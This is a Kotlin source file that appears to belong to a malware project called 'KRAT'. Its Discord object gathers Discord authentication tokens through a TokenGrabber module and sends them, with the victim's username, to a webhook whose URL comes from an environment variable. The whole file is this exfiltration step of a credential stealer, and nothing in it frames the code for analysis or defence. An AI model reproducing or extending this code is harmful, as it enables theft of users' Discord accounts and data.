package services

import KRAT.user
import io.github.cdimascio.dotenv.dotenv
import services.discord.TokenGrabber.getTokens
import utils.DiscordWebhook
import utils.ListUtils.removeDuplicates

object Discord {
    fun webhook(): DiscordWebhook {
        return DiscordWebhook(dotenv()["WEBHOOK_URL"]).apply {
            username = user
        }
    }

    fun sendTokens() {
        val tokens = getTokens()?.removeDuplicates()
        if (tokens == null || tokens.isEmpty()) return

        webhook().apply {
            embeds.add(
                DiscordWebhook.EmbedObject()
                    .setTitle("Discord token detected")
                    .setDescription("**Tokens:** ${tokens.map { "```$it```" }.joinToString()}")
            )
            execute()
        }
    }
}